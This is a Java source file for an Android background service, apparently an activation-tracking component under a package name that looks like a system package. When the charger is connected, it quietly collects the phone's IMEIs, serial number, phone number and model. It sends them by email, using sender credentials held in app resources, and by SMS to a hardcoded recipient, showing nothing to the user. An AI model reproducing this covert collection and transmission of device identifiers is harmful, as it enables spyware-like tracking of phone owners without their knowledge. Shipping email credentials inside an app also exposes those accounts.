package com.android.seeken.services;

import android.app.Activity;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.android.seeken.R;
import com.android.seeken.data.PhoneDetails;
import com.android.seeken.mail.SendMailIntentService;
import com.android.seeken.utility.CommonUtils;
import com.android.seeken.utility.Constants;
import com.android.seeken.utility.PreferenceHelper;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import static android.content.Intent.ACTION_POWER_CONNECTED;


public class SeekenService extends Service {

    private static final String TAG = SeekenService.class.getSimpleName();
    private static final int ACTIVATION_YEAR = 2017;

    public SeekenService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.e(TAG + "onCreate :", "onCreate");
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e(TAG + "onStartCommand :", "onStartCommand");

        if (intent != null && intent.getStringExtra(Constants.ACTION_ARG) != null) {
            switch (intent.getStringExtra(Constants.ACTION_ARG)) {
                case ACTION_POWER_CONNECTED:
                    PhoneDetails phoneDetails = getPhoneDetails();
                    sendPhoneDetailsAsMail(phoneDetails);
                    sendPhoneDetailsAsMessage(phoneDetails);
                    break;
                case Constants.IS_FROM_BOOT_COMPLETED:
                case Constants.IS_FROM_SIM_CHANGED:
                    if (TextUtils.isEmpty(PreferenceHelper.getActivatedTime(this)) && isSimSupport()) {
                        String currentDateAndTime = getCurrentDate();
                        PreferenceHelper.setActivatedTime(this, currentDateAndTime);
                    }
                    break;
            }
        }
        destroyServiceIfDataTransferred();
        return START_STICKY;

    }

    private String getCurrentDate() {
        if (isActivationYearWrong()) return "";
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
        return sdf.format(new Date());
    }

    private boolean isActivationYearWrong() {
        SimpleDateFormat sdfYear = new SimpleDateFormat("yyyy", Locale.getDefault());
        int year = Integer.parseInt(sdfYear.format(new Date()));
        return year < ACTIVATION_YEAR;
    }

    private void destroyServiceIfDataTransferred() {
        if (PreferenceHelper.isDataSent(this))
            stopSelf();
    }

    private void sendPhoneDetailsAsMessage(PhoneDetails phoneDetails) {
        if (!PreferenceHelper.isMessageSent(this) && isSimSupport()) {
            sendSMS(phoneDetails.smsReceiver, CommonUtils.getMessage(this, phoneDetails));
        }
    }

    private void sendPhoneDetailsAsMail(PhoneDetails phoneDetails) {
        if (!PreferenceHelper.isEmailSent(this) && isSimSupport()) {
            SendMailIntentService.sendMail(this, phoneDetails);
        }
    }

    private boolean isSimSupport() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  //gets the current TelephonyManager
        return tm.getSimState() == TelephonyManager.SIM_STATE_READY;
    }


    //---sends an SMS message to another device---
    private void sendSMS(String phoneNumber, String message) {
        String SENT = "SMS_SENT";
        String DELIVERED = "SMS_DELIVERED";

        PendingIntent sentPI = PendingIntent.getBroadcast(this, 0,
                new Intent(SENT), 0);

        PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0,
                new Intent(DELIVERED), 0);

        //---when the SMS has been sent---
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                    case Activity.RESULT_OK:
                        /*Toast.makeText(getBaseContext(), "SMS sent",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        /*Toast.makeText(getBaseContext(), "Generic failure",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        /*Toast.makeText(getBaseContext(), "No service",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        /*Toast.makeText(getBaseContext(), "Null PDU",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        /*Toast.makeText(getBaseContext(), "Radio off",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                }
                unregisterReceiver(this);
            }
        }, new IntentFilter(SENT));

        //---when the SMS has been delivered---
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                    case Activity.RESULT_OK:
                        /*Toast.makeText(getBaseContext(), "SMS delivered",
                                Toast.LENGTH_SHORT).show();*/
                        PreferenceHelper.setMessageSent(SeekenService.this, true);
                        break;
                    case Activity.RESULT_CANCELED:
                        /*Toast.makeText(getBaseContext(), "SMS not delivered",
                                Toast.LENGTH_SHORT).show();*/
                        break;
                }
                unregisterReceiver(this);
            }
        }, new IntentFilter(DELIVERED));

        SmsManager sms = SmsManager.getDefault();
        ArrayList<String> dividedMessage = sms.divideMessage(message);
        ArrayList<PendingIntent> sentIntents = new ArrayList<>(1);
        sentIntents.add(sentPI);
        ArrayList<PendingIntent> deliveryIntents = new ArrayList<>(1);
        deliveryIntents.add(deliveredPI);
        sms.sendMultipartTextMessage(phoneNumber, null, dividedMessage,
                sentIntents, deliveryIntents);
    }

    private PhoneDetails getPhoneDetails() {
        PhoneDetails phoneDetails = new PhoneDetails();

        phoneDetails.activatedDate = getActivatedTime();
        phoneDetails.model = getModel();
        phoneDetails.serialNumber = getSerialNumber();
        phoneDetails.IMEI_1 = getIMEI_1();
        phoneDetails.IMEI_2 = getIMEI_2();
        phoneDetails.phoneNumber = getPhoneNumber();

        phoneDetails.mailSubject = getString(R.string.mail_subject, phoneDetails.activatedDate);
        phoneDetails.mailSender = getString(R.string.mail_sender);
        phoneDetails.mailSenderPassword = getString(R.string.mail_sender_password);
        phoneDetails.mailReceiver = getString(R.string.mail_receiver);
        phoneDetails.smsReceiver = getString(R.string.sms_receiver);

        return phoneDetails;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    private String getActivatedTime() {
        String activatedTime = PreferenceHelper.getActivatedTime(this);
        if (TextUtils.isEmpty(activatedTime)) {
            activatedTime = getCurrentDate();
        }
        return activatedTime;
    }

    private String getModel() {
        return Build.MODEL;
    }

    private String getSerialNumber() {
        return Build.SERIAL;
    }


    private String getIMEI_1() {
        String IMEI_1 = "No_perMission";
        if (hasPermission("android.permission.READ_PHONE_STATE")) {
            TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                IMEI_1 = TelephonyMgr.getDeviceId(0); // permission required accessing PHONE_STATE
            } else {
                IMEI_1 = TelephonyMgr.getDeviceId();
            }
        }
        return IMEI_1;
    }

    private String getIMEI_2() {
        String IMEI_2 = "No_perMission";
        if (hasPermission("android.permission.READ_PHONE_STATE")) {
            TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                IMEI_2 = TelephonyMgr.getDeviceId(1); // permission required accessing PHONE_STATE
            } else {
                IMEI_2 = TelephonyMgr.getDeviceId();
            }
        }
        return IMEI_2;
    }

    private String getPhoneNumber() {
        String mPhoneNumber = "No_perMission";
        if (hasPermission("android.permission.READ_PHONE_STATE")) {
            TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
            mPhoneNumber = tMgr.getLine1Number();
        }
        return mPhoneNumber;
    }

    /**
     * Determines if the context calling has the required permission
     *
     * @param permission - The permissions to check
     * @return true if the IPC has the granted permission
     */
    public boolean hasPermission(String permission) {

        int res = checkCallingOrSelfPermission(permission);

        Log.v(TAG, "permission: " + permission + " = \t\t" +
                (res == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));

        return res == PackageManager.PERMISSION_GRANTED;

    }

}
